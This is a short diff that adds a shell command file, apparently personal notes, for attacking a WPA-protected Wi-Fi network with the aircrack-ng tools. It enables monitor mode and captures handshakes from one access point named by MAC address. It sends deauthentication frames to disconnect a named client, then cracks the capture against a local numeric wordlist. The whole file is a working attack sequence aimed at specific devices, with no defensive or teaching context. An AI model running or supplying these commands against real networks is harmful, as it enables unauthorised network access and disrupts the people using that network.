@@ -1,0 +1,9 @@
+airmon-ng stop eth0
+airmon-ng check wlan0
+airmon-ng check kill pid
+airmon-ng start wlan0 1
+airodump-ng -c 1 --bssid F4:6A:92:CE:6D:B9 -w psk wlan0mon
+tcpdump -i wlan0mon "tcp[tcpflags] & (tcp-ack) != 0"
+aireplay-ng -0 -4 -a F4:6A:92:CE:6D:B9 -c 4C:49:E3:1A:3A:A3 wlan0mon
+aircrack-ng -w /media/legend/DATA/Desktop/GenDict/num/num.txt -b F4:6A:92:CE:6D:B9 psk*.cap
+
